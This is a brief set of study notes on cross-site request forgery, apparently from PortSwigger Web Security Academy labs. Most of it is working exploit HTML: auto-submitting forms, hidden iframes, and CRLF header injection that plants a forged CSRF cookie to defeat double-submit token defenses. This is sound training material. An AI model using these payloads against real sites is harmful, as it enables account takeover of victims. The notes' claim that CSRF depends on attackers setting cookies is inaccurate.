# Cross-Site Request Forgery

Cross-Site Request Forgery (CSRF) occurs when a web application allows an attacker to manipulate a victim's browser to perform actions on the victim's behalf without their consent.

## Understanding CSRF

CSRF attacks are possible if the website enables attackers to set cookies in a victim's browser, leading to unauthorized actions being performed.

### Key Terminology

- WSA: Web Security Academy
- CSRF: Cross-Site Request Forgery

### Practice Lab

For practical experience and further insights into CSRF vulnerabilities, you can access the [Practice Lab](https://portswigger.net/web-security/csrf).

## Basic CSRF HTML from WSA Labs

```html
<html>
    <body>
        <form action="https://vulnerable-website.com/email/change" method="POST">
            <input type="hidden" name="email" value="pwned@evil-user.net" />
        </form>
        <script>
            document.forms[0].submit();
        </script>
    </body>
</html>
```

### WSA Lab Exploits

Double submit CSRF vuln -- where token is duplicated in cookie and the search function has no CSRF protection:

```html
<img src="https://ac601faf1e15b2b6c001282f00970098.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=fake" onerror="document.forms[0].submit();"/>
```

#### Lab 5
```html
<html>
    <body>
        <h1>Hello World!</h1>
        <iframe style="display:none" name="csrf-iframe"></iframe>
        <form action="https://ac151f291fb50bc28036e5bb00f6000b.web-security-academy.net/my-account/change-email" method="post" id="csrf-form" target="csrf-iframe">
            <input type="hidden" name="email" value="test5@test.ca">
            <input type="hidden" name="csrf" value="SXsROOTp3jzq6M5UzIL2KkJIqGpffIQb">
        </form>

        <img style="display:none;" src="https://ac151f291fb50bc28036e5bb00f6000b.web-security-academy.net/?search=hat%0d%0aSet-Cookie:%20csrfKey=ho7GGxMe4EZSrQ8xZ0sBDq2yW0ey9bKH" onerror="document.forms[0].submit()">
    </body>
</html>
```

#### Lab 6
```html
<html>
    <body>
        <h1>Hello World!</h1>
        <iframe style="display:none" name="csrf-iframe"></iframe>
        <form action="https://ac601faf1e15b2b6c001282f00970098.web-security-academy.net/my-account/change-email" method="post" target="csrf-iframe">
            <input type="hidden" name="email" value="testboyifyoudonot@test.ca">
            <input type="hidden" name="csrf" value="hacked">
        </form>

        <img style="display:none;" src="https://ac601faf1e15b2b6c001282f00970098.web-security-academy.net/?search=hat%0d%0aSet-Cookie:%20csrf=hacked" onerror="document.forms[0].submit()">
    </body>
</html>
```